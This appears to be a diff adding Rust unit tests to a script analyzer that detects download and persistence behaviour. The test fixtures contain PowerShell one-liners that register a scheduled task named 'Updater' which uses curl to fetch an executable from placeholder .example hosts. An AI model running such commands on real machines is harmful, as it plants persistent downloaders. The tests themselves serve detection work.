@@ -2733,6 +2733,46 @@ schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/
     }
 
     #[test]
+    fn powershell_scheduled_task_delayed_url_does_not_cross_single_amp_separator() {
+        let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c set U=https://ps-task-amp.example/p.exe&curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src.contains("&curl")
+            )),
+            "PowerShell scheduled-task URL crossed single ampersand command separator: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ps-task-amp.example/p.exe"
+            )),
+            "PowerShell scheduled-task clean ampersand-separator URL missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_scheduled_task_delayed_url_preserves_query_ampersands() {
+        let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c set U=https://ps-task-query.example/p.exe?a=1&b=2&&curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ps-task-query.example/p.exe?a=1&b=2"
+            )),
+            "PowerShell scheduled-task query ampersand URL was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_positional_register_scheduled_task_emits_persistence_trait() {
         let script = br#"powershell -Command "$a = New-ScheduledTaskAction 'cmd.exe' '/c calc.exe'; Register-ScheduledTask Updater -Action $a -Force"
 "#;
